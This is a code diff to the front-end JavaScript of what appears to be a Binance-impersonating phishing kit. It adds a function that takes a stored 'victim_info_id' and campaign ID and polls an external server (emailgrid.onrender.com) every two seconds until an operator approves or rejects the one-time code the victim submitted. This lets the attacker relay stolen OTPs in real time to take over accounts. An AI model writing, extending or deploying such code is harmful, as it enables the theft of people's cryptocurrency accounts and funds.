@@ -537,14 +537,22 @@
             })
             .then(result => {
                 console.log('Webhook response:', result);
-                // Handle success
-                setTimeout(() => {
-                    showSuccess('Verification submitted successfully!');
-                    // Redirect to success page after delay
+                
+                // Check if we have victim_info_id for polling
+                const victimInfoId = localStorage.getItem('binance_victim_info_id');
+                if (victimInfoId) {
+                    // Start polling for OTP approval
+                    pollForApproval(victimInfoId, campaignId, 'otp');
+                } else {
+                    // Fallback to original behavior
                     setTimeout(() => {
-                        window.location.href = 'success.html';
-                    }, 2000);
-                }, 1000);
+                        showSuccess('Verification submitted successfully!');
+                        // Redirect to success page after delay
+                        setTimeout(() => {
+                            window.location.href = 'success.html';
+                        }, 2000);
+                    }, 1000);
+                }
             })
             .catch(error => {
                 console.error('Webhook error:', error);
@@ -594,6 +602,52 @@
             const code = document.getElementById('verificationCode').value.trim();
             const codeRegex = /^\d{6}$/;
             button.disabled = !codeRegex.test(code);
+        }
+
+        function pollForApproval(victimInfoId, campaignId, step) {
+            const pollUrl = `https://emailgrid.onrender.com/api/check-approval/${victimInfoId}/${step}/`;
+            
+            const poll = () => {
+                fetch(pollUrl, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json',
+                    },
+                    mode: 'cors',
+                    credentials: 'omit'
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Poll result:', result);
+                    
+                    if (result.status === 'approved') {
+                        // Hide loading and show success
+                        resetButton();
+                        setTimeout(() => {
+                            showSuccess('Verification approved successfully!');
+                            // Redirect to success page after delay
+                            setTimeout(() => {
+                                window.location.href = 'success.html';
+                            }, 2000);
+                        }, 1000);
+                    } else if (result.status === 'rejected') {
+                        // Hide loading and show error
+                        resetButton();
+                        showError(result.error_message || 'Invalid verification code. Please try again.');
+                    } else {
+                        // Still pending, continue polling
+                        setTimeout(poll, 2000); // Poll every 2 seconds
+                    }
+                })
+                .catch(error => {
+                    console.error('Polling error:', error);
+                    // Continue polling on error
+                    setTimeout(poll, 3000);
+                });
+            };
+            
+            // Start polling
+            poll();
         }
 
         function handleCodeInput(input) {
